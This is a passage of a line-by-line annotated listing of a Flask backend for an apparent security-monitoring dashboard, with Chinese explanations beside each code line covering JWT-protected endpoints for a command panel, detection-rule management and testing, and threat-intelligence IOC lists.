| 1598 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"status": "ok", "ip": ip}), 200` |
| 1599 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1600 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 命令面板 ----------------------------------------------------` |
| 1601 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/command", methods=["POST"])` |
| 1602 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1603 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.limit("30 per minute")` |
| 1604 | 函数定义：声明 `api_command` 的输入、处理逻辑和返回结果。 | `    def api_command():  # type: ignore[unused-function]` |
| 1605 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        data = request.get_json(silent=True) or {}` |
| 1606 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw = str(data.get("command", "")).strip()` |
| 1607 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(_execute_safe_command(raw, state)), 200` |
| 1608 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1609 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 规则 CRUD + 测试 + seed -----------------------------------` |
| 1610 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/rules", methods=["GET", "POST"])` |
| 1611 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1612 | 函数定义：声明 `api_rules` 的输入、处理逻辑和返回结果。 | `    def api_rules():  # type: ignore[unused-function]` |
| 1613 | 条件判断：满足条件时进入对应分支。 | `        if request.method == "GET":` |
| 1614 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `            type_ = request.args.get("type") or None` |
| 1615 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `            q = request.args.get("q") or None` |
| 1616 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `            enabled_raw = request.args.get("enabled")` |
| 1617 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            enabled: Optional[bool] = None` |
| 1618 | 条件判断：满足条件时进入对应分支。 | `            if enabled_raw is not None and enabled_raw != "":` |
| 1619 | 条件判断：满足条件时进入对应分支。 | `                if enabled_raw.lower() in ("true", "1", "yes"):` |
| 1620 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    enabled = True` |
| 1621 | 条件分支：前面条件不满足时继续判断。 | `                elif enabled_raw.lower() in ("false", "0", "no"):` |
| 1622 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    enabled = False` |
| 1623 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 1624 | 返回结果：把处理后的值交回调用方。 | `                    return jsonify({"error": "enabled 取值非法（true/false）"}), 400` |
| 1625 | 条件判断：满足条件时进入对应分支。 | `            if type_ and type_ not in RULE_TYPES:` |
| 1626 | 返回结果：把处理后的值交回调用方。 | `                return jsonify({"error": f"type 必须是 {list(RULE_TYPES)}"}), 400` |
| 1627 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            items = _list_rules_from_db(type_=type_, enabled=enabled, q=q)` |
| 1628 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            resp = jsonify(items)` |
| 1629 | 函数调用：执行已有函数/方法完成当前步骤。 | `            resp.headers["X-Total-Count"] = str(len(items))` |
| 1630 | 代码语句：参与当前文件的业务流程或数据处理。 | `            resp.headers["Access-Control-Expose-Headers"] = "X-Total-Count"` |
| 1631 | 返回结果：把处理后的值交回调用方。 | `            return resp, 200` |
| 1632 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1633 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        payload = request.get_json(silent=True) or {}` |
| 1634 | 函数调用：执行已有函数/方法完成当前步骤。 | `        normalized, err = _validate_rule_payload(payload)` |
| 1635 | 条件判断：满足条件时进入对应分支。 | `        if err or not normalized:` |
| 1636 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": err or "规则校验失败"}), 400` |
| 1637 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = _insert_rule_from_normalized(normalized)` |
| 1638 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(_rule_row_to_api_dict(row)), 201` |
| 1639 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1640 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/rules/<rule_id>", methods=["GET", "PUT", "DELETE"])` |
| 1641 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1642 | 函数定义：声明 `api_rule_detail` 的输入、处理逻辑和返回结果。 | `    def api_rule_detail(rule_id: str):  # type: ignore[unused-function]` |
| 1643 | 条件判断：满足条件时进入对应分支。 | `        if request.method == "GET":` |
| 1644 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = db.session.get(Rule, rule_id)` |
| 1645 | 条件判断：满足条件时进入对应分支。 | `            if not row:` |
| 1646 | 返回结果：把处理后的值交回调用方。 | `                return jsonify({"error": "规则不存在"}), 404` |
| 1647 | 返回结果：把处理后的值交回调用方。 | `            return jsonify(_rule_row_to_api_dict(row)), 200` |
| 1648 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1649 | 条件判断：满足条件时进入对应分支。 | `        if request.method == "PUT":` |
| 1650 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = db.session.get(Rule, rule_id)` |
| 1651 | 条件判断：满足条件时进入对应分支。 | `            if not row:` |
| 1652 | 返回结果：把处理后的值交回调用方。 | `                return jsonify({"error": "规则不存在"}), 404` |
| 1653 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `            payload = request.get_json(silent=True) or {}` |
| 1654 | 函数调用：执行已有函数/方法完成当前步骤。 | `            normalized, err = _validate_rule_payload(payload, partial=True)` |
| 1655 | 条件判断：满足条件时进入对应分支。 | `            if err or normalized is None:` |
| 1656 | 返回结果：把处理后的值交回调用方。 | `                return jsonify({"error": err or "规则校验失败"}), 400` |
| 1657 | 条件判断：满足条件时进入对应分支。 | `            if not normalized:` |
| 1658 | 返回结果：把处理后的值交回调用方。 | `                return jsonify({"error": "请求体为空"}), 400` |
| 1659 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            merged = dict(_rule_row_to_api_dict(row))` |
| 1660 | 循环：逐个处理集合或迭代器中的元素。 | `            for k, v in normalized.items():` |
| 1661 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                merged[k] = v` |
| 1662 | 函数调用：执行已有函数/方法完成当前步骤。 | `            full_check, err2 = _validate_rule_payload(merged)` |
| 1663 | 条件判断：满足条件时进入对应分支。 | `            if err2 or not full_check:` |
| 1664 | 返回结果：把处理后的值交回调用方。 | `                return jsonify({"error": err2 or "规则校验失败"}), 400` |
| 1665 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _apply_partial_to_rule_row(row, normalized)` |
| 1666 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.commit()` |
| 1667 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.refresh(row)` |
| 1668 | 返回结果：把处理后的值交回调用方。 | `            return jsonify(_rule_row_to_api_dict(row)), 200` |
| 1669 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1670 | 注释：解释下面或当前这段代码的设计意图。 | `        # DELETE` |
| 1671 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = db.session.get(Rule, rule_id)` |
| 1672 | 条件判断：满足条件时进入对应分支。 | `        if not row:` |
| 1673 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "规则不存在"}), 404` |
| 1674 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.delete(row)` |
| 1675 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 1676 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"status": "ok", "id": rule_id}), 200` |
| 1677 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1678 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/rules/<rule_id>/toggle", methods=["PATCH"])` |
| 1679 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1680 | 函数定义：声明 `api_rule_toggle` 的输入、处理逻辑和返回结果。 | `    def api_rule_toggle(rule_id: str):  # type: ignore[unused-function]` |
| 1681 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = db.session.get(Rule, rule_id)` |
| 1682 | 条件判断：满足条件时进入对应分支。 | `        if not row:` |
| 1683 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "规则不存在"}), 404` |
| 1684 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        payload = request.get_json(silent=True) or {}` |
| 1685 | 条件判断：满足条件时进入对应分支。 | `        if "enabled" in payload:` |
| 1686 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row.enabled = bool(payload["enabled"])` |
| 1687 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 1688 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row.enabled = not bool(row.enabled)` |
| 1689 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.updated_at = datetime.now(timezone.utc)` |
| 1690 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 1691 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.refresh(row)` |
| 1692 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(_rule_row_to_api_dict(row)), 200` |
| 1693 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1694 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/rules/test", methods=["POST"])` |
| 1695 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1696 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.limit("60 per minute")` |
| 1697 | 函数定义：声明 `api_rule_test` 的输入、处理逻辑和返回结果。 | `    def api_rule_test():  # type: ignore[unused-function]` |
| 1698 | 文档字符串：说明当前模块、类或函数的职责。 | `        """根据请求体校验规则命中。两种用法：` |
| 1699 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1700 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        1) 仅测试已保存规则：\`{"rule_id": "xxx", "sample": {...}}\`` |
| 1701 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        2) 测试临时规则（编辑抽屉尚未保存）：\`{"rule": {...}, "sample": {...}}\`` |
| 1702 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 1703 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        payload = request.get_json(silent=True) or {}` |
| 1704 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        sample = payload.get("sample") or {}` |
| 1705 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(sample, dict):` |
| 1706 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "sample 必须是对象"}), 400` |
| 1707 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1708 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rule_id = payload.get("rule_id")` |
| 1709 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rule: Optional[Dict[str, Any]] = None` |
| 1710 | 条件判断：满足条件时进入对应分支。 | `        if rule_id:` |
| 1711 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            db_row = db.session.get(Rule, str(rule_id))` |
| 1712 | 条件判断：满足条件时进入对应分支。 | `            if not db_row:` |
| 1713 | 返回结果：把处理后的值交回调用方。 | `                return jsonify({"error": "规则不存在"}), 404` |
| 1714 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            rule = _rule_row_to_api_dict(db_row)` |
| 1715 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 1716 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw = payload.get("rule")` |
| 1717 | 条件判断：满足条件时进入对应分支。 | `            if not isinstance(raw, dict):` |
| 1718 | 返回结果：把处理后的值交回调用方。 | `                return jsonify({"error": "必须提供 rule_id 或 rule 对象"}), 400` |
| 1719 | 函数调用：执行已有函数/方法完成当前步骤。 | `            normalized, err = _validate_rule_payload(raw)` |
| 1720 | 条件判断：满足条件时进入对应分支。 | `            if err or not normalized:` |
| 1721 | 返回结果：把处理后的值交回调用方。 | `                return jsonify({"error": err or "规则校验失败"}), 400` |
| 1722 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            rule = normalized` |
| 1723 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1724 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = _evaluate_rule(rule, sample)` |
| 1725 | 注释：解释下面或当前这段代码的设计意图。 | `        # 命中 且 规则来自已保存：累加 hits 以便表格能显示真实数据` |
| 1726 | 条件判断：满足条件时进入对应分支。 | `        if result.get("matched") and rule_id and db.session.get(Rule, str(rule_id)):` |
| 1727 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _incr_rule_hits_db(str(rule_id))` |
| 1728 | 注释：解释下面或当前这段代码的设计意图。 | `        # 附加一份结果快照，便于前端直接回显` |
| 1729 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["rule"] = {` |
| 1730 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "id": rule.get("id"),` |
| 1731 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "name": rule.get("name"),` |
| 1732 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "type": rule.get("type"),` |
| 1733 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "pattern": rule.get("pattern"),` |
| 1734 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "action": rule.get("action"),` |
| 1735 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "level": rule.get("level"),` |
| 1736 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 1737 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(result), 200` |
| 1738 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1739 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/rules/_seed", methods=["POST"])` |
| 1740 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1741 | 函数定义：声明 `api_rules_seed` 的输入、处理逻辑和返回结果。 | `    def api_rules_seed():  # type: ignore[unused-function]` |
| 1742 | 文档字符串：说明当前模块、类或函数的职责。 | `        """DEBUG 或 ALLOW_DEV_SEED 下可用，便于 UI review。"""` |
| 1743 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = get_config()` |
| 1744 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        allow = bool(getattr(cfg, "DEBUG", False)) or (` |
| 1745 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.environ.get("ALLOW_DEV_SEED", "").lower() == "true"` |
| 1746 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1747 | 条件判断：满足条件时进入对应分支。 | `        if not allow:` |
| 1748 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "dev seed 在当前环境未启用"}), 403` |
| 1749 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        created = _seed_demo_rules(app)` |
| 1750 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"status": "ok", "created": created}), 201` |
| 1751 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1752 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/threat_intel", methods=["GET"])` |
| 1753 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1754 | 函数定义：声明 `api_threat_intel` 的输入、处理逻辑和返回结果。 | `    def api_threat_intel():  # type: ignore[unused-function]` |
| 1755 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        type_ = request.args.get("type") or None` |
| 1756 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        source = request.args.get("source") or None` |
| 1757 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        q = request.args.get("q") or None` |
| 1758 | 条件判断：满足条件时进入对应分支。 | `        if type_ and type_ not in IOC_TYPES:` |
| 1759 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": f"type 必须是 {list(IOC_TYPES)}"}), 400` |
| 1760 | 导入对象：从指定模块引入类、函数或常量。 | `        from src.collectors.ioc_repository import IOCRepository` |
| 1761 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.database import db` |
| 1762 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1763 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rows = IOCRepository(db.session).list_active_dicts()` |
| 1764 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        needle = (q or "").strip().lower()` |
| 1765 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        entries: List[Dict[str, Any]] = []` |
| 1766 | 循环：逐个处理集合或迭代器中的元素。 | `        for d in rows:` |
| 1767 | 条件判断：满足条件时进入对应分支。 | `            if type_ and d["ioc_type"] != type_:` |
| 1768 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 1769 | 条件判断：满足条件时进入对应分支。 | `            if source and source not in (d.get("sources") or []):` |
| 1770 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 1771 | 条件判断：满足条件时进入对应分支。 | `            if needle:` |
| 1772 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                hay = " ".join(` |
| 1773 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    [` |
| 1774 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        str(d.get("value", "")),` |
| 1775 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        str(d.get("reason", "")),` |
| 1776 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        str(d.get("note", "")),` |
| 1777 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        " ".join(d.get("sources") or []),` |
| 1778 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    ]` |
| 1779 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ).lower()` |
| 1780 | 条件判断：满足条件时进入对应分支。 | `                if needle not in hay:` |
| 1781 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 1782 | 函数调用：执行已有函数/方法完成当前步骤。 | `            entries.append(_db_ioc_row_to_api_entry(d))` |
| 1783 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        by_type: Dict[str, int] = {}` |
| 1784 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        by_source: Dict[str, int] = {}` |
| 1785 | 循环：逐个处理集合或迭代器中的元素。 | `        for e in entries:` |
| 1786 | 函数调用：执行已有函数/方法完成当前步骤。 | `            by_type[e.get("type", "unknown")] = by_type.get(e.get("type", "unknown"), 0) + 1` |
| 1787 | 循环：逐个处理集合或迭代器中的元素。 | `            for s in e.get("sources") or []:` |
| 1788 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                by_source[s] = by_source.get(s, 0) + 1` |
| 1789 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stats = {` |
| 1790 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "total": len(entries),` |
| 1791 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "by_type": by_type,` |
| 1792 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "by_source": by_source,` |
| 1793 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 1794 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `        resp = jsonify({"stats": stats, "entries": entries})` |
| 1795 | 函数调用：执行已有函数/方法完成当前步骤。 | `        resp.headers["X-Total-Count"] = str(len(entries))` |
| 1796 | 代码语句：参与当前文件的业务流程或数据处理。 | `        resp.headers["Access-Control-Expose-Headers"] = "X-Total-Count"` |
| 1797 | 返回结果：把处理后的值交回调用方。 | `        return resp, 200` |
| 1798 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1799 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/threat_intel/providers", methods=["GET"])` |
| 1800 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1801 | 函数定义：声明 `api_threat_intel_providers` 的输入、处理逻辑和返回结果。 | `    def api_threat_intel_providers():  # type: ignore[unused-function]` |
| 1802 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ti: ThreatIntelCollector = app.extensions["guardian_threat_intel"]` |
| 1803 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock = _threat_intel_mock_enabled()` |
| 1804 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1805 | 函数定义：声明 `_key_provider` 的输入、处理逻辑和返回结果。 | `        def _key_provider(has_key: bool) -> Dict[str, Any]:` |
| 1806 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 1807 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "enabled": bool(has_key) or mock,` |
| 1808 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "configured": bool(has_key),` |
| 1809 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "mock": mock and not has_key,` |
| 1810 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "status": "live"` |
| 1811 | 条件判断：满足条件时进入对应分支。 | `                if has_key` |
| 1812 | 兜底分支：处理前面条件都不满足的情况。 | `                else ("mock" if mock else "not_configured"),` |
| 1813 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 1814 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1815 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pending = {` |
| 1816 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "enabled": False,` |
| 1817 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "configured": False,` |
| 1818 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "mock": False,` |
| 1819 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "status": "not_configured",` |
| 1820 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 1821 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 1822 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            jsonify(` |
| 1823 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 1824 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "local": {` |
| 1825 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "enabled": True,` |
| 1826 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "configured": True,` |
| 1827 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "mock": False,` |
| 1828 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "status": "live",` |
| 1829 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    },` |
| 1830 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "abuseipdb": _key_provider(bool(ti.abuseipdb_key)),` |
| 1831 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "virustotal": _key_provider(bool(ti.virustotal_key)),` |
| 1832 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "spamhaus": pending,` |
| 1833 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "phishtank": pending,` |
| 1834 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "openphish": pending,` |
| 1835 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "nvd": pending,` |
| 1836 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "cnvd": pending,` |
| 1837 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 1838 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 1839 | 代码语句：参与当前文件的业务流程或数据处理。 | `            200,` |
| 1840 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1841 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1842 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/threat_intel/iocs", methods=["POST"])` |
| 1843 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1844 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.limit("60 per minute")` |
| 1845 | 函数定义：声明 `api_threat_intel_add_ioc` 的输入、处理逻辑和返回结果。 | `    def api_threat_intel_add_ioc():  # type: ignore[unused-function]` |
| 1846 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        payload = request.get_json(silent=True) or {}` |
| 1847 | 函数调用：执行已有函数/方法完成当前步骤。 | `        normalized, err = _validate_ioc_payload(payload)` |
| 1848 | 条件判断：满足条件时进入对应分支。 | `        if err or not normalized:` |
| 1849 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": err or "IOC 校验失败"}), 400` |
| 1850 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1851 | 导入对象：从指定模块引入类、函数或常量。 | `        from src.collectors.ioc_repository import IOCRepository` |
| 1852 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.database import db` |
| 1853 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1854 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ti: ThreatIntelCollector = app.extensions["guardian_threat_intel"]` |
| 1855 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = IOCRepository(db.session).upsert_merge(` |
| 1856 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ioc_type=normalized["type"],` |
| 1857 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value=normalized["value"],` |
| 1858 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source=normalized.get("source", "manual"),` |
| 1859 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            score=normalized.get("score"),` |
| 1860 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ttl_seconds=normalized.get("ttl_seconds"),` |
| 1861 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            reason=normalized.get("reason"),` |
| 1862 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            note=normalized.get("note"),` |
| 1863 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            metadata=normalized.get("metadata"),` |
| 1864 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1865 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 1866 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ti.add_ioc_to_blacklist(normalized["type"], normalized["value"])` |
| 1867 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(_db_ioc_row_to_api_entry(row)), 201` |
| 1868 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1869 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route(` |
| 1870 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "/api/threat_intel/iocs/<ioc_type>/<path:value>", methods=["DELETE"]` |
| 1871 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 1872 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1873 | 函数定义：声明 `api_threat_intel_remove_ioc` 的输入、处理逻辑和返回结果。 | `    def api_threat_intel_remove_ioc(ioc_type: str, value: str):  # type: ignore[unused-function]` |
| 1874 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type not in IOC_TYPES:` |
| 1875 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": f"type 必须是 {list(IOC_TYPES)}"}), 400` |
| 1876 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        canon = _canonical_ioc_value(ioc_type, value)` |
| 1877 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "ip" and not validate_ip(canon):` |
| 1878 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的 IP 地址"}), 400` |
| 1879 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "domain" and not _is_valid_domain(canon):` |
| 1880 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的域名"}), 400` |
| 1881 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "url" and not _is_valid_url(canon):` |
| 1882 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的 URL"}), 400` |
| 1883 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "file_hash" and not _is_valid_file_hash(canon):` |
